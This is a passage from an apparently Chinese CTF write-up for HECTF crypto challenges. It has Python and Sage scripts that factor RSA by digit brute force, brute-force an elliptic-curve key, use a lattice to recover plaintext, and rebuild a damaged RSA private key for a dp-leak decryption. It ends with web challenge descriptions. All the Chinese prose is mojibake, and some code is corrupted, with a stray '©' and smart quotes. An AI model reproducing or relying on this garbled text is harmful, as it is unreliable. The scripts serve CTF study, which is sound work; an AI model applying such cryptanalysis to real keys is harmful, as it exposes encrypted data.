æœ€ä½çš„ k ä½ï¼Œåˆ™å·²çŸ¥ q</p><p>æœ€é«˜çš„ k ä½ã€‚å‡è®¾å·²çŸ¥ k ä½çš„ p,q ï¼Œè®°ä¸º ph,qhï¼Œåˆ©ç”¨ä¸ç­‰å¼</p><p>ph Â·qh.21024-2k &lt;=n&lt;(ph+1) Â·(qh+ 1).21024-2k</p><p>é€ä½å‘ä½åœ°å€çˆ†ç ´ï¼Œä¸æ–­æ”¶ç¼©ä¸ç­‰å¼çš„èŒƒå›´ï¼Œæœ€ç»ˆå¯æ±‚å¾— pï¼Œq çš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">404647938065363927581436797059920217726808592032894907516792959730610309231807721432452916075249512425255272010683662156287639951458857927130814934886426437345595825614662468173297926187946521587383884561536234303887166938763945988155320294755695229129209227291017751192918550531251138235455644646249817136993</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t</span>(<span class="params">a, b, k</span>):</span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">77</span>:</span><br><span class="line">        <span class="keyword">if</span> a*b == n:</span><br><span class="line">            <span class="built_in">print</span>(a, b)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            a1 = a + i*(<span class="number">10</span>**k) + j*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            b1 = b + j*(<span class="number">10</span>**k) + i*(<span class="number">10</span>**(<span class="number">154</span>-k))</span><br><span class="line">            <span class="keyword">if</span> a1*b1 &gt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> (a1+(<span class="number">10</span>**(<span class="number">154</span>-k)))*(b1+(<span class="number">10</span>**(<span class="number">154</span>-k))) &lt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">if</span> ((a1*b1)%(<span class="number">10</span>**(k+<span class="number">1</span>))) != (n%(<span class="number">10</span>**(k+<span class="number">1</span>))):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            t(a1, b1, k+<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    t(i*(<span class="number">10</span>**<span class="number">77</span>), i*(<span class="number">10</span>**<span class="number">77</span>), <span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse, long_to_bytes</span><br><span class="line"></span><br><span class="line">p = <span class="number">39316409865082827891559777929907275271727781922450971403181273772573121561800306699150395758615464222134092274991810028405823897933152302724628919678029201</span></span><br><span class="line">q = <span class="number">10292087691982642720325133979832850482001819947229043122246451685759305199660300816512137527737218130417905422918772717257270992977795519872828056890461393</span></span><br><span class="line">c = <span class="number">365683379886722889532600303686680978443674067781851827634350197114193449886360409198931986483197030101273917834823409997256928872225094802167525677723275059148476025160768252077264285289388640035034637732158021710365512158554924957332812612377993122491979204310133332259340515767896224408367368108253503373778</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n=p*q</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">m = long_to_bytes(m)</span><br><span class="line">m = base64.b64decode(m)</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="comment">#b&#x27;HECTF&#123;I_rea1ly_l0ve_c2ypto!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="ä¸åˆæ ¼çš„é­”è¯"><a class="markdownIt-Anchor" href="#ä¸åˆæ ¼çš„é­”è¯">#</a> ä¸åˆæ ¼çš„é­”è¯ï¼š</h3><p>æ ¹æ®é¢˜ç›®æè¿°çš„æç¤ºå¯ä»¥çœ‹åˆ°é¢˜ç›®ä¸­å¥½å‡ å¤„å‚æ•°ä¸åˆç†çš„åœ°æ–¹ï¼Œæ¯”å¦‚ p,q çš„å¤§å°ç­‰ï¼Œå› ä¸ºå¼‚æˆ–æ“ä½œå¹¶ä¸ä¼šæŠŠå¤šä½™çš„éƒ¨åˆ†å»æ‰ï¼Œæ‰€ä»¥å¯†æ–‡ä¸­æ³„éœ²äº†å¾ˆå¤šæ¶ˆæ¯ï¼Œä½†è¿˜æœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯å¦‚ä½•æ±‚ keyï¼Œè¿™æ—¶ä¸€ä¸ª ECDLP é—®é¢˜ï¼Œå¯ä»¥é‡‡ç”¨ MOV æ”»å‡»ï¼Œä¸è¿‡æ—¢ç„¶å‚æ•°ä¸åˆç†ï¼Œä¹Ÿå¯ä»¥å°è¯•çˆ†ç ´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">9604080254440553624043823039323876524034439909584709693304859297324410855942111467832096190746534800378359779991381701244554754870303658957438266614583487</span></span><br><span class="line">q = <span class="number">7117529167860499983120234872664469946810713755399747931099511148595647881645694071900284496403308583631053530870961375928947111857317803005696543076720079</span></span><br><span class="line">a = <span class="number">4681007517868949260473646867708411042804596292653498068045093108939357065240201843535644313612886376810286247810943227474659270191834401055704514648846995</span></span><br><span class="line">b = <span class="number">5604862515726338933576748414825616582947323501967288114322080747741801017833194347273532400730033226601964489467416955741018175785792514035352083708135431</span></span><br><span class="line">x = <span class="number">5544706922427110224110125906620053049906095568886481576326706308027915868515721429471522223193053363494813044921519216114372968191072598748704528735817403</span></span><br><span class="line">x1 = <span class="number">0x2fa8e23f18ed4a9bd752a0c22b0750c17fbb66c76554e2089258fd979a5736b7766c974fb9788acf17fb065dc1daec6a8a6e98021de6c4ce3cde11dd54590e1d</span></span><br><span class="line">y1 = <span class="number">0xa3ce4bb1e25563b577a45cd06153d2dab584a70130c7ae71e65fe5e11b60493ccb845fbe4989dbd4a60d6a1ff12baa268b8833ed30f7c7e21c32268a139b5b6b</span></span><br><span class="line">c = [<span class="number">36780810764729391947601691590378765170863850291763672158886689602006275675399596108959250284869355070618680265311484525337488013177333417742808496794250706127014303883956401715343247310936978778751394980638177344654524711571648231122027699452582302505466999915200896495338587961829985149664712686944510559820</span>, <span class="number">20958199004445348755624931477686903609410629089817702686793041731031202915294487428236505796231417377524290926704880107242252471250791747709149963693453815320856114055076830778689575609444155241642860745570792018879816650383543271943138193405548674967958109800776284787612370057476837642989670234913968669332</span>, <span class="number">19758181515666300263334531148587391869707566215385658759724970483060039216682585723722462835458856503531814316860237786892749700501436669071048571605926728917066797641628644730857333648930286503355701843365288276242984029888215453858844295912023305616753086127934173496355853797241944921600781294012353332277</span>, <span class="number">45576628433681427718167093217006549620067042472164439269014690121698560736312716407875326404496263261341269644373184438703912129559084380247641072914940830606649124606611794031719696797961847217643536070335745057048220615012019629278484208808353027070994021979997462190775853832457224157083880895894000484461</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ˆæ±‚keyï¼Œå¯ä»¥ç”¨MOVæ”»å‡»ï¼Œä¹Ÿå¯ä»¥ç›´æ¥çˆ†ç ´ï¼Œè¿™é‡Œç›´æ¥çˆ†ç ´äº†</span></span><br><span class="line">Ep = EllipticCurve(GF(p), [a, <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">G = Ep.lift_x(x)</span><br><span class="line">hint1 = Ep(x1, y1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>):</span><br><span class="line">    <span class="keyword">if</span> hint1 ==  key * G:</span><br><span class="line">        <span class="built_in">print</span>(key)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># key = 51517</span></span><br><span class="line"><span class="comment"># ç„¶åæ±‚flag,å¯ä»¥ç”¨é“œåŒ å®šç†ä¹Ÿå¯ä»¥æ„é€ æ ¼å­</span></span><br><span class="line">n = p*q</span><br><span class="line">k = md5(long_to_bytes(key)).hexdigest().encode()</span><br><span class="line">Cur=EllipticCurve(Zmod(n),[a,b])</span><br><span class="line">aes = AES.new(k, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">m=[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recover</span>(<span class="params">x,y</span>):</span><br><span class="line">    M=Matrix(ZZ,[[<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">2</span>^<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>*x*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">256</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,(<span class="number">3</span>*x^<span class="number">2</span>+a)*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,-<span class="number">1</span>*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">256</span>,<span class="number">0</span>,-<span class="number">2</span>*y*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>^<span class="number">512</span>,(x^<span class="number">3</span>+a*x-y^<span class="number">2</span>+b)*<span class="number">2</span>^<span class="number">512</span>],</span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,n*<span class="number">2</span>^<span class="number">512</span>]])</span><br><span class="line">    v=M.LLL()[-<span class="number">1</span>]</span><br><span class="line">    dx=<span class="built_in">int</span>(v[<span class="number">2</span>])//<span class="number">2</span>^<span class="number">256</span></span><br><span class="line">    dy=<span class="built_in">int</span>(v[<span class="number">4</span>])//<span class="number">2</span>^<span class="number">256</span></span><br><span class="line">    gx=x+dx</span><br><span class="line">    gy=y+dy</span><br><span class="line">    m.append(x^^gx)</span><br><span class="line">    m.append(y^^gy)</span><br><span class="line">recover(c[<span class="number">0</span>],c[<span class="number">1</span>])</span><br><span class="line">recover(c[<span class="number">2</span>],c[<span class="number">3</span>])</span><br><span class="line">out=<span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    out+=aes.decrypt(long_to_bytes(i))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;HECTF&#123;&#x27;</span>+ out+ <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦"><a class="markdownIt-Anchor" href="#æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦">#</a> æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</h3><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“è¯ä¹¦çš„åŸºæœ¬æ ¼å¼ åœ¨è¯ä¹¦ä¸­å¿…ç„¶å«æœ‰ -----BEGIN PRIVATE KEY-----<br> è¿™ä¸€æ®µå¯ä»¥æ‹†æˆ<br> 2d 2d 2d 2d 2d 42 45 47 49</p><p>4e 20 50 52 49 56 41 54 45</p><p>20 4b 45 59 2d 2d 2d 2d 2d<br> å’Œå·²ç»æ•´ç†å¥½çš„ç›¸æ¯”<br> 49 47 45 42 2d 2d 2d 2d 2d</p><p>45 54 41 56 49 52 50 20 4e</p><p>2d 2d 2d 2d 2d 59 45 4b 20<br> å¾ˆå®¹æ˜“çœ‹å‡º 1 å’Œ 9 æ¢ 2 å’Œ 8 æ¢ 3 å’Œ 7 æ¢ 4 å’Œ 6 æ¢</p><p>æˆ‘ä»¬å°†è¯ä¹¦æ•´ç†ä¸€ä¸‹ å¯ä»¥å¾—</p><p>30 82 04 bc 02 01 00 30 0d<br>06 09 2a 86 48 86 f7 0d 01<br>01 01 05 00 04 82 04 a6 30<br>82 04 a2 02 01 00 02 82 01<br>01 00 bd db 99 13 77 8d 23<br>15 44 9b 58 7f bd 7f 6e 41<br>94 4d 1c 9c 54 84 c9 b0 1f<br>bf 53 44 93 35 5c f8 84 89<br>cb f9 63 0f 42 99 bb 4d bb<br>84 df 7b d6 60 7b 7a 57 8f<br>84 e4 c6 d6 a7 0f 50 6c 16<br>a4 31 1b 15 08 e3 97 5d b7<br>1e 71 d6 d2 d1 7d d7 5b 9c<br>23 e2 d4 37 bc f7 f5 d9 50<br>6e 76 3c 71 22 a5 76 fd 5c<br>15 90 5a b4 5f eb a2 0a 24<br>12 86 28 5b 8b a5 d6 db d1<br>b7 d0 ce 97 5a b7 4e ae 33<br>8f e0 dd 5a 19 4d 02 91 8e<br>4f 0a d6 d1 60 f1 b7 30 74<br>3f c2 c8 eb 74 db 01 08 9d<br>21 0d 50 c5 aa 1f 25 97 93<br>b5 12 b2 6a 8f 3e 62 cc 6a<br>95 e9 ce f6 5e 5d 49 e9 e6<br>6d 35 2d db b1 40 8f a9 fe<br>5b 29 a1 64 2c 61 d2 c4 d3<br>2c 66 c5 6d d6 fa 36 39 b2<br>14 6b 1f 59 29 89 6a ba b4<br>b1 ed 35 ec f5 7d d6 30 ce<br>ca c1 5f cc 6b 74 3f 97 f0<br>86 f2 c6 04 0e 66 e9 1e 92<br>05 31 ba 61 2b e1 92 7b 67<br>54 52 5e 08 e5 19 02 03 01<br>00 01 02 82 01 00 04 62 04</p><p>ä¸­é—´è¢«æ‰“ç¢äº†<br> d4 8d 90 d8 0f 02 81 80 51<br>a5 f7 e7 f4 c0 50 a5 0e 18<br>fd e1 2f ce e2 64 6f 2b 43<br>16 0b 0c 75 ab 49 25 e8 26<br>9a e8 0e 70 cf 12 73 4f 41<br>fa b1 8d 04 24 ed 7c ce b7<br>dd b2 7c be 0f 55 4f 7a 6e<br>16 98 d4 ec 5b a2 b4 8d 61<br>2e 23 37 ae b7 5f 8a 57 d8<br>15 5a 11 d0 7b 2c 49 d3 d9<br>7c 4f f0 cf b8 9e 6d d4 f3<br>6c c3 7c 01 0b 5b c8 93 56<br>a3 9b 57 6c c3 ed d0 3c dc<br>4d 79 1d f5 09 1a 55 71 df<br>1a 6c 15 ee da a0 77 3c f3<br>cf 02 81 80 0f c6 1f 05 d1<br>9c 96 ee c3 ed ca cc a3 4e<br>1d 3e 2c ab 43 9b eb ab 66<br>93 a3 ce 2c a9 9f 88 ab 9c<br>dd 18 3c eb 8e 80 1d 82 98<br>f8 35 35 98 64 ef 19 1d b3<br>f5 32 69 97 6b a0 4b 03 60<br>6e 54 08 59 de cd 05 80 5c<br>4a a7 9d c6 db 22 38 06 58<br>ea f0 bf fb a0 f4 e7 19 bc<br>f1 b1 e0 41 69 d8 e0 cb 3a<br>f4 d9 0b 2e 62 d7 c7 ed 30<br>45 d4 9b 52 5c a7 15 ca 3b<br>84 f0 7b 4e ce 27 d0 4d 17<br>95 29 9f a1 86 cd 02 81 80<br>25 c2 0a b2 52 9f 1e fd 3d<br>35 34 7c 57 3b 28 2a bf d9<br>5b 26 4c 92 f6 c4 f9 ec 8b<br>7c 71 32 06 fb ea 18 86 88<br>0e 29 a3 6c 47 ef 9b b7 53<br>ce 95 67 ea 4d 3e 08 3c 30<br>f3 44 02 2f 95 b7 cd 71 14<br>81 3b f6 a2 8e cc 67 d5 fe<br>05 95 32 42 68 4c d2 9c 1c<br>5d d8 a7 44 16 89 0e 5c 94<br>3c 70 90 4b a7 0e 34 9b 15<br>71 9a 46 6f 90 1f bf 0c fc<br>78 40 f8 03 2e 31 af bc cf<br>b8 4f 4a 81 7e a5 1c 8f 90<br>fd 6a 2d 2d 2d 2d 2d 45 4e<br>44 20 50 52 49 56 41 54 45<br>20 4b 45 59 2d 2d 2d 2d 2d</p><p>æ ¹æ® rsa è¯ä¹¦æ ¼å¼ æˆ‘ä»¬å¯ä»¥å¾—åˆ°<br>æ ‡è¯†å¤´ 30</p><p>æ€»é•¿åº¦ 82 04bc</p><p>ç‰ˆæœ¬ä¿¡æ¯ 0201 00300d06092a864886f70d0101010500048204a6308204a2020100</p><p>n 02820101 00bddb9913778d2315449b587fbd7f6e41944d1c9c5484c9b01fbf534493355cf88489cbf9630f4299bb4dbb84df7bd6607b7a578f84e4c6d6a70f506c16a4311b1508e3975db71e71d6d2d17dd75b9c23e2d437bcf7f5d9506e763c7122a576fd5c15905ab45feba20a241286285b8ba5d6dbd1b7d0ce975ab74eae338fe0dd5a194d02918e4f0ad6d160f1b730743fc2c8eb74db01089d210d50c5aa1f259793b512b26a8f3e62cc6a95e9cef65e5d49e9e66d352ddbb1408fa9fe5b29a1642c61d2c4d32c66c56dd6fa3639b2146b1f5929896abab4b1ed35ecf57dd630cecac15fcc6b743f97f086f2c6040e66e91e920531ba612be1927b6754525e08e519</p><p>e 0203 010001</p><p>d 02820100</p><p>046204ï¼ˆæ²¡ç”¨ï¼‰</p><p>q d48d90d80fï¼ˆæ²¡ç”¨ï¼‰</p><p>dp 028180</p><p>51a5f7e7f4c050a50e18fde12fcee2646f2b43160b0c75ab4925e8269ae80e70cf12734f41fab18d0424ed7cceb7ddb27cbe0f554f7a6e1698d4ec5ba2b48d612e2337aeb75f8a57d8155a11d07b2c49d3d97c4ff0cfb89e6dd4f36cc37c010b5bc89356a39b576cc3edd03cdc4d791df5091a5571df1a6c15eedaa0773cf3cf</p><p>dq 028180</p><p>0fc61f05d19c96eec3edcacca34e1d3e2cab439bebab6693a3ce2ca99f88ab9cdd183ceb8e801d8298f835359864ef191db3f53269976ba04b03606e540859decd05805c4aa79dc6db22380658eaf0bffba0f4e719bcf1b1e04169d8e0cb3af4d90b2e62d7c7ed3045d49b525ca715ca3b84f07b4ece27d04d1795299fa186cd</p><p>inv(q,p) 028180</p><p>25c20ab2529f1efd3d35347c573b282abfd95b264c92f6c4f9ec8b7c713206fbea1886880e29a36c47ef9bb753ce9567ea4d3e083c30f344022f95b7cd7114813bf6a28ecc67d5fe05953242684cd29c1c5dd8a74416890e5c943c70904ba70e349b15719a466f901fbf0cfc7840f8032e31afbccfb84f4a817ea51c8f90fd6a</p><p><img data-src="https://i-blog.csdnimg.cn/direct/3be30da7583d4ebd84509ed31b1e9164.jpeg#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å¯ä»¥é€šè¿‡ openssl è¿›è¡Œä¸€äº›äº†è§£ æˆ–è€…ä¿®è¡¥ç§é’¥ ä½†ä¸æ˜¯æœ¬é¢˜çš„è€ƒç‚¹<br>ï¼ˆä¸Šå›¾ä¸º openssl ä¸­ä¿®å¥½çš„ç§˜é’¥ å¯ä»¥çœ‹åˆ°åå…­è¿›åˆ¶éƒ¨åˆ†æ˜¯ç›¸åŒçš„ï¼‰</p><p>å¾—åˆ°è¿™äº›å æˆ‘ä»¬å°±å¯ä»¥æ¥ä¸€ä¸ªç®€å•çš„ dp æ³„éœ²<br>ä½†æ˜¯è¦æ³¨æ„ï¼Œæˆ‘ä¹‹å‰æåˆ°äº†æ˜æ–‡ä¸­æœ‰ä¸­æ–‡ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä½¿ç”¨ PKCS1_OAEP è§£å¯†å™¨<br>ä¼ ç»Ÿçš„è§£å¯†è„šæœ¬æ— æ•ˆ</p><p>ä»¥ä¸‹æ˜¯è„šæœ¬</p><p>from Crypto.PublicKey import RSA<br>from Crypto.Cipher import PKCS1_OAEP<br>from Crypto.Util.number import inverse, long_to_bytes<br>import binascii</p><p>hex_p = â€œ0x00efaf90cae18eedc592a6cc57e6f4fb8812cd663274c90c0c82240b4a13c6d1772bab4f32f087cf3179f93513da0775529422f3c1ed5a0b8c2bd81bcd65a2451eab291585d1f39cc7dfc4c36ef2ff0e9be22d9252c80c7e11cd493542c27731965a5603dde878356433d07b99431eb69dc9856931583e9ced764503bded010857â€<br>hex_q = â€œ0x00cac7cc600b5e888df3f9e905d48d088d1a15819dbde1c8501028ffe3b02bf237acb277b43eda8a2110e9b6931cbfffe6eeade466611be17454f2d0c848a567e77065e82ff4f2aa0de7bfe1e622d060f67a5f6fc87e5859ed6aec857cf8124418b4c73a40628fdddd002504444acb31fb0b4ea35068ec8c1ffb933ed48d90d80fâ€<br>hex_e = â€œ0x10001â€<br>hex_c = â€œ0x92c8bf09c04cf0193306f9203b19956fbcbe796c6e65fdaefeb49c5fb0391c1f78552d5fb4385ba3dfd11efb23759fdc386a2336e827b0be5b3514522b8063149d584edef58f2d64b4e8d6c9e5813de1d27b4c3fe970abfb4495700ed04b496bf1eb8d90b5a836ba3d852e0038d943ce116d691ec1490750c62b1cd19a1816ade9325c9ac739255b1c24e95cc387050ff521c3f60882efe33c66409498654ed39bc6c1253c21e3e78dc67937666a2ae64826cfe4767f24a5712069ec3a31e0f36ce4ef473041f8df8e553e72771d81b6ef75a95d29172483fcc33ea9c396f98af037527d4f6bd0cbf033e1f8263aba1f1cb35fca87e119c4b953526be191ada6â€</p><p>p = int(hex_p, 16)<br>q = int(hex_q, 16)<br>e = int(hex_e, 16)<br>c = int(hex_c, 16)</p><p>n = p * q</p><p>phi_n = (p - 1) * (q - 1)</p><p>d = inverse(e, phi_n)</p><p>rsa_key = RSA.construct((n, e, d, p, q))</p><p># ä½¿ç”¨ PKCS1_OAEP åˆå§‹åŒ–è§£å¯†å™¨<br> cipher = PKCS1_OAEP.new (rsa_key)</p><p># å°†å¯†æ–‡è½¬ä¸ºå­—èŠ‚å½¢å¼<br> ciphertext_bytes = long_to_bytesÂ©</p><p>decrypted_message_bytes = cipher.decrypt(ciphertext_bytes)<br># å°†è§£å¯†åçš„å­—èŠ‚æ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œä½¿ç”¨ UTF-8 è§£ç <br> message = decrypted_message_bytes.decode (â€˜utf-8â€™)<br>print(â€œDecrypted Message:â€, message)</p><p t1an_dog_no_g3t_g00d_d1e="">Decrypted Message: ä½ çŸ¥é“ä¹ˆï¼Œrsa çš„å¤§æ•°åˆ†è§£çš„åšå›ºå°±åƒçˆ±æƒ…ä¸€æ ·åšä¸å¯æ‘§ï¼Œä½ æ„¿æ„è®©æˆ‘ä»¬ä¹Ÿåƒ rsa ä¸€æ ·åšä¸å¯æ‘§ä¹ˆï¼Ÿä½†æ˜¯ä½ å¹¶ä¸å…³å¿ƒç»“å±€ï¼Œä½ åªå…³å¿ƒä½ çš„ flag:HECTF</p><h1 id="é¢˜ç›®æè¿°è®°å½•"><a class="markdownIt-Anchor" href="#é¢˜ç›®æè¿°è®°å½•">#</a> é¢˜ç›®æè¿°è®°å½•ï¼š</h1><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2">#</a> Webï¼š</h2><h3 id="are-u-happy"><a class="markdownIt-Anchor" href="#are-u-happy">#</a> <strong>Are u happy</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å¼€å§‹å¼€å¿ƒåœ°ç©è€å§ï¼</p></blockquote><h3 id="baby_sql-2"><a class="markdownIt-Anchor" href="#baby_sql-2">#</a> <strong>baby_sql</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den çš„å…¬å¸é‡Œæœ‰ä¸ªè®°å½•å‘˜å·¥æ‰“å¡çš„åå°ï¼Œåªæœ‰ admin æ‰èƒ½ç™»é™†ï¼Œä½†æ˜¯ï¼Œg01den å‘ç°ï¼Œæ¯æ¬¡å»å…¬å¸è§†å¯Ÿçš„æ—¶å€™å…¬å¸é‡Œçš„å‘˜å·¥æ€»æ•°å§‹ç»ˆå’Œæ‰“å¡äº†çš„å‘˜å·¥æ•°ç›®å¯¹ä¸ä¸Šï¼Œg01den æ€€ç–‘å…¬å¸é‡Œçš„æŸä½å‘˜å·¥åˆ©ç”¨äº†æ¼æ´ï¼Œäºæ˜¯ä»–åœ¨åå°ç¨‹åºé‡Œå¢åŠ äº†ä¸€äº› WAFï¼Œå¹¶ä¸”ä»–å¯¹ä»–è‡ªå·±çš„ WAF å¾ˆè‡ªä¿¡ï¼Œå¹¶æš—ç¤ºäº†é‚£ä½å‘˜å·¥ä»–åœ¨æ•°æ®åº“é‡Œæ”¾äº†ä¸€ä¸ªé‡è¦çš„ä¿¡æ¯ï¼ˆflagï¼‰ï¼Œèƒ½æ‹¿åˆ°è¿™ä¸ªä¿¡æ¯ï¼ˆflagï¼‰çš„äººå¹´ç»ˆå¯ä»¥è·å¾—é¢å¤–çš„å¥–é‡‘ã€‚ä½œä¸ºé‚£ä½å‘˜å·¥çš„ä½ åº”è¯¥å¦‚ä½•æ‹¿åˆ°è¿™ä¸ªä¿¡æ¯è·å¾—å¥–é‡‘å‘¢ï¼Ÿ flag ç”± HECTF å¼€å¤´ï¼Œå¾—åˆ°çš„ç­”æ¡ˆè¯·å°† hectf ä¿®æ”¹ä¸ºå¤§å†™ HECTFï¼Œflag ä¸­é™¤äº†å¼€å¤´çš„ HECTF å¤–ï¼Œæ— å¤§å†™å­—æ¯</p></blockquote><h3 id="baby_unserialize-2"><a class="markdownIt-Anchor" href="#baby_unserialize-2">#</a> <strong>baby_unserialize</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–ï¼Œä¸€ä¸ªç®€å•çš„ RCE</p></blockquote><h3 id="ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™-2"><a class="markdownIt-Anchor" href="#ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™-2">#</a> <strong>ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>w41tm00n ç¬¬ä¸€æ¬¡å­¦ä¹ å¼€å‘ç½‘ç«™ï¼Œè€æ¿è®©ä»–ä¸‰å¤©ä¹‹å†…æå®šã€‚ç¬¬äºŒå¤©ï¼Œw41tm00n ç»ˆäºå†™å®Œäº†ä»£ç ï¼Œå¹¶ä¸”è¿›è¡Œäº†è°ƒè¯•ï¼Œç½‘ç«™åœ¨æœåŠ¡å™¨ä¸Šèƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯ w41tm00n 